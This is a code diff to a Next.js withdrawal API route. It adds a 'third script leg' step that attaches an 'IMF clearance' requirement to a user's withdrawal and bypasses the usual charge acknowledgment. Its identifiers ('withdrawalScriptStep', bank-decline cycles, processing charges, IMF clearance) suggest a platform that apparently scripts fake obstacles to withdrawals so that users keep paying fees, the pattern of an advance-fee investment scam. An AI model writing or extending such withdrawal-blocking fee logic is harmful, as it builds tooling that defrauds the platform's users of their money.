@@ -17,6 +17,7 @@ import {
   isWithdrawalScriptCycleComplete,
   repairScriptCycleWithdrawalState,
   allowsNewWithdrawalAfterBankDecline,
+  attachImfClearanceForThirdScriptLeg,
 } from "@/lib/withdrawal-script";
 import {
   resolveWithdrawalScriptStage,
@@ -286,12 +287,19 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: labels[parsed.data.method] ?? "Additional details required" }, { status: 400 });
     }
 
+    const userStepRow = await prisma.user.findUnique({
+      where: { id: userId },
+      select: { withdrawalScriptStep: true },
+    });
+    const userStepForPost = userStepRow?.withdrawalScriptStep ?? 0;
+    const thirdScriptLeg = scriptSettings.enabled && userStepForPost === 3;
+
     const activeCharge = await getActiveUserWithdrawalCharge(userId);
     const chargeAmount = activeCharge
       ? computeWithdrawalChargeAmount(activeCharge, parsed.data.amountUsd)
       : null;
 
-    if (activeCharge && !parsed.data.chargeAcknowledged) {
+    if (activeCharge && !parsed.data.chargeAcknowledged && !thirdScriptLeg) {
       return NextResponse.json({
         requiresChargeAcknowledgment: true,
         chargeAmount,
@@ -302,11 +310,6 @@ export async function POST(req: NextRequest) {
     }
 
     const activeCycle = scriptSettings.enabled ? await findActiveScriptCycleWithdrawal(userId) : null;
-    const userStepRow = await prisma.user.findUnique({
-      where: { id: userId },
-      select: { withdrawalScriptStep: true },
-    });
-    const userStepForPost = userStepRow?.withdrawalScriptStep ?? 0;
     if (
       activeCycle &&
       !allowsNewWithdrawalAfterBankDecline(activeCycle, userStepForPost)
@@ -327,7 +330,8 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    const hasCharge = !!activeCharge && chargeAmount != null && chargeAmount > 0;
+    const hasCharge =
+      !thirdScriptLeg && !!activeCharge && chargeAmount != null && chargeAmount > 0;
     const amountUsd = parsed.data.amountUsd;
 
     await ensureWithdrawalScriptSchema();
@@ -391,6 +395,10 @@ export async function POST(req: NextRequest) {
         });
       }
 
+      if (thirdScriptLeg) {
+        await attachImfClearanceForThirdScriptLeg(userId, created.id, amountUsd, tx);
+      }
+
       return created;
     });
 
@@ -416,6 +424,7 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({
       success: true,
       requiresChargePayment: hasCharge,
+      requiresImfClearance: thirdScriptLeg,
       chargeAmount: chargeAmount,
       message: hasCharge
         ? `Withdrawal submitted and funds deducted. Pay the ${formatCurrency(chargeAmount!)} processing charge to continue.`
